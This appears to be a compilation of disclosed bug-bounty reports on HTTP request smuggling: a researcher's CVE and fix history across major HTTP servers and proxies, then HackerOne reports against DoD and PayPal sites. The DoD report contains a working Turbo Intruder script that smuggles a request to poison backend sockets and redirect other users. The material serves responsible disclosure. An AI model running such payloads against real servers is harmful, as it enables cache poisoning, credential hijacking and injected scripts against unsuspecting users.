 * **CVE-2017-7658**: Too Tolerant Parser, Double Content-Length + Transfer-Encoding + Whitespace 
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7658 (score 6.5)


# Apache httpd

 * https://bz.apache.org/bugzilla/show_bug.cgi?id=57832 : Apache issues on 'socket poisoning', where we could store HTTP responses on
  the reverse proxy by sending extra responses, and mix these response with other users later. Not fixed via a CVE because this behavior
  was not considered as a real security issue (it's a consequence of a successful splitting attack on the backend, or of a compromised backend).
  If you ask my opinion this is one of the most problematic issue I found on these 5 years. Fixs were included in 2016 on version 2.4.24.

 * **CVE-2016-8743** : httpd: Apache HTTP Request Parsing Whitespace Defects : problems with CR, FF, VTAB and others strange characeters in parsing HTTP messages
 especially the space before colon problem. They were also some HTTP 0.9 downgrades.
 This work contributed to the internal dev debates around the HttpProtocolOptions Strict|LenientMethods|Allow0.9 option added on 2.4

 * **CVE-2015-3183** : chunk header attribute truncation (low)

# Facebook Proxygen

Proxygen is a C++ Open Source library which is the core library for Facebook HTTP related projects

In 2016 I reported several smuggling issues (about doubled headers or bad end of line, for example), via the facebook bounty program `#1710044992591113`

# Apsis Pound

Pound is an open Source SSL terminator, but the project has not published major changes for a long time, and I experienced difficulties having my reports fixed and delivered to final users.
After reports on 09-2016 a Version 2.8a fixing the flaws was published on 10-2016 but marked as experimental.
Details of the flaws were published in 07-2018. CVE was reserved by myslef on 2018-01. A version 2.8 was published on 2018-05.

 * **CVE-2016-10711** : Apsis Pound before 2.8a allows request smuggling via crafted headers

Details of issues (double Content Length, chunk prioriy, headers concatenation vuia NULL character, etc.) are published on my blog post https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/

# Nodejs

 * **CVE-2016-2086** (but not CVE-2016-2216 from the same release) : support of bad end of lines (especially \r followed by anything) + double Content Length, + mixed chunked and Content Length + space before colon

# Tomcat

 * **CVE-2016-6816** : Tomcat 6,7 & 8: HTTP/0.9 downgrade and various bad characters support

# Varnish

 * Varnish3 :  **CVE-2015-8852** : received after public disclosure : https://seclists.org/oss-sec/2016/q2/95
 * Varnish4 : 2016 : space before colon fix without CVE : https://github.com/varnishcache/varnish-cache/commit/0577f3fba200e45c05099427eec01610ee061436
 cache poisoning of Varnish4 with a golang traefik server as backend was demonstrated to the project maintainer, but the project 'does not like CVE'.
 * Varnish 4 : 2016 messsage splitting on bad characters fixed without CVE : https://github.com/varnishcache/varnish-cache/commit/d1eb31109f614976f06dd506a63e0fa21185a89b

HTTP/0.9 support was also removed after my reports in 2015, but without public disclosure of potential abuse.

# golang (go language)

 * **CVE-2015-5739** : "Content Length" magically fixed to "Content-Length."
 * **CVE-2015-5740** : support of double Content-Length
 * 01-2016 : integer overflow on chunk size : https://go-review.googlesource.com/c/go/+/18871
 * 06-2016 : downgrade HTTP/0.9 : https://github.com/golang/go/issues/16197, no CVE, as described in the commit comment
 "@regilero also mentioned there might be some cache poisoning or request smuggling possibilities here, but I don't see how. It seems to only affect the person making the bogus request." (sic)
 * 06-2016 : Splitting on space + colon

# Nginx

Not the project where I had the most success, I do not think any smuggling issue would be considered a security issue.

 * Integer overflow on Content Length : fixed without CVE : http://hg.nginx.org/nginx/rev/15a15f6ae3a2 after a report and a proposed patch (not as good as the final one)
  the security team 'don't consider this to be something serious from security point of view and have no plans for CVE and/or security advisories'.
 I made examples of exploitation at https://regilero.github.io/english/security/2015/03/25/nginx-integer_truncation/
 * https://trac.nginx.org/nginx/ticket/762 : 0.9 downgrade: protocol version overflow; HTTP/65536.8 or HTTP/65536.9 treated as a 0.9 request
 rejected as a security issue, classified as minor issue, fixed 1 year and 6 month after public report (11-2016). This was in my mind quite huge.
 * https://trac.nginx.org/nginx/ticket/1014 : wontfix : I'd like an error 400 instead of silently ignoring a bad header, no success

# OpenBSD

In 2015 the OpenBSD Http server was very new, crashing on 0.9 requests, I reported some smuggling issues (bad end of line, double Content-Length) which were fixed later.

# HaProxy

HaProxy was transmitting some of the very bad request I use to perform splitting attacks on backends (something which is not a security issue, but which allows security issues).
I had various discussions with Willy Tarreau which leaded to some improvments in HaProxy, blocking bad requests before any less robust HTTP parser could read it.

For example:

 * commit 987aa383c85525b163267110a4bcff4dff3849b8 : BUG/MEDIUM: http: remove content-length from chunked messages
 * commit e1ce063c12bf22b99e6caa6a55484f1b9a27e113 : MEDIUM: http: disable support for HTTP/0.9 by default
 * commit b053c03d6f05c8ddf264de78fe321d8455358690 : MEDIUM: http: restrict the HTTP version token to 1 digit as per RFC7230

# Summary

I think this work allows for more robusts HTTP servers. Some of the very old issues already reported in the 2005 era reports, like double Content Length,
were still widely supported in 2015 and are now harder to find on most open source http servers. I think I contributed greatly to enforce the RFC 7230
anti-smuggling policies (chunk priority, no double content-length) and for the removal of old-rfc dangerous features (like the continuation of headers
with the space prefix, or the HTTP/0.9 support). For this I just had to read the 2005 studies and the RFC, tests the servers, and try to explain
exploitations.

A big part of my added work and reports was studying effects of control characters (\r, \n, NULL, vtab, htab, bell, backspace & formfeed) on various parts of the messages.
With some real good success on vartious project for NULL or for bad enf of lines.
Another big thing was studying the HTTP/0.9 downgrade exploitations (like extracting a valid HTTP message stored in an image from a partial 0.9 response) and
finding new 0.9 downgrade vectors.
Finally another part of this work was finding new attack vectors (truncation of size, overflows, concatenation of strings, effects of cache hit on header parsing, etc).

The last big part of my work was spending a long time explaining the potential attacks to maintainers. If you need hints from people understanding the smuggling attacks
and the implications of the fixed flaws, usually better than the project maintainers, I could give you some names. If you need samples of reports or detailled lab exploitations I could also deliver.

HTTP/2 or TLS are not preventing bad effects of HTTP/1.1 bad parsers (they embed HTTP/1.1 parsers in another layer), nor they could prevent effects of an HTTP/0.9 downgrades.
Every HTTP actors which enforces a more robust protocol parsing prevents chaining effects of smuggling attacks.
So I hope the work I made on the subject had real effects on the ecosystem.

Some of these CVE were already elected for bounties:
- Verizon: undisclosed (#433076): 2 700 USD
- Apache httpd CVE-2016-8743 : https://hackerone.com/reports/244459 : 1500 USD
- FaceBook Proxygen: (bugcrowd) 1000 USD
- Golang CVE-2015-5739 &CVE-2015-5740 : Google Security Bounty program : 1337 USD

## Impact

For the final user the consequences may be huge:
- Cache poisoning : so effects starts at Deny of Service, but may go to code injection (like replacing
 the code of a well known js library)
- Credentials hijacking : one of the smuggling exploitation is storing unterminated requests and waiting
 for other users requests to terminate the pending requests, mixing the users credentials on something
 they did not requested (hijacking users credentials). But this cannot work on applications using csrf protections.
- a lot of Deny of Service attacks, one of the attacks allows mixing requests and responses of
 different users, so you have documents requested by others, and they have yours.
- security filter bypass: here the public effect is less important, the attacker use smuggling to
 remove some of the security layers

A massive scale smuggling attack on a big actor (a cloud provider for example) could make a huge DOS.
A more realist usage with a public consequence is a targeted cache poisoning, to inject an XSS.
An advanced usage is the filter bypass usage, where the smuggled requests is usually not even logged. A prefect way of sending requests without notices, so a nice tool for SSRF exploits.

---

### [Request smuggling on ████████](https://hackerone.com/reports/526880)

- **Report ID:** `526880`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** U.S. Dept Of Defense
- **Reporter:** @albinowax
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:42:20.348Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**


**Description:**
The sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.

This vulnerability occurs because the backend server regards` \n` as a valid header ending, whereas the backend only thinks `\r\n` is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.

## Impact
Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.

## Step-by-step Reproduction Instructions
To replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:

I've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    

    attack = '''POST /████ HTTP/1.1
Fooz: bar\nTransfer-Encoding: chunked
Host: stage.█████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Foo: bar

0

GET███████ HTTP/1.1
X: X'''

    engine.queue(attack)

    victim = '''GET /foo.jpg?x=%s HTTP/1.1
Host: stage.████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive

'''
    for i in range(15):
        engine.queue(victim, i)
        time.sleep(0.2)


def handleResponse(req, interesting):
    table.add(req)

 ```
You should observe that one of the responses to a victim request is a 302 redirect to █████████

## Suggested Mitigation/Remediation Actions
When I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:

```
stage.████████.		59	IN	A	██████████
stage.████.		59	IN	A	████████
stage.█████.		59	IN	A	██████
stage.███████.		59	IN	A	█████
stage.████.		59	IN	A	██████████
stage.██████████.		59	IN	A	█████
```

## Impact

Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.

**Summary (researcher):**

I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

---

### [Bypass for #488147 enables stored XSS on https://paypal.com/signin again](https://hackerone.com/reports/510152)

- **Report ID:** `510152`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** PayPal
- **Reporter:** @albinowax
- **Bounty:** 20000 usd
- **Disclosed:** 2019-08-07T21:55:24.339Z
- **CVE(s):** -

**Summary (team):**

Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page. PayPal worked with the researcher and our technical teams to remediate the issue and confirm there was no evidence of real-world attacks.

**Summary (researcher):**

I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

---

### [Stored XSS on https://paypal.com/signin via cache poisoning](https://hackerone.com/reports/488147)

- **Report ID:** `488147`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** PayPal
- **Reporter:** @albinowax
- **Bounty:** 18900 usd
- **Disclosed:** 2019-08-07T21:55:09.579Z
- **CVE(s):** -

**Summary (team):**

Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page. PayPal worked with the researcher and our technical teams to remediate the issue and confirm there was no evidence of real-world attacks.

**Summary (researcher):**

I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

---

### [Hackerone1](https://hackerone.com/reports/471087)

- **Report ID:** `471087`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** RATELIMITED
- **Reporter:** @yasinylcn17
- **Bounty:** - usd
- **Disclosed:** 2018-12-21T23:49:38.367Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** [add summary of the vulnerability]

**Description:** [add more details about this vulnerability]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. [add step]
  1. [add step]
  1. [add step]

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Impact

Kkx

---
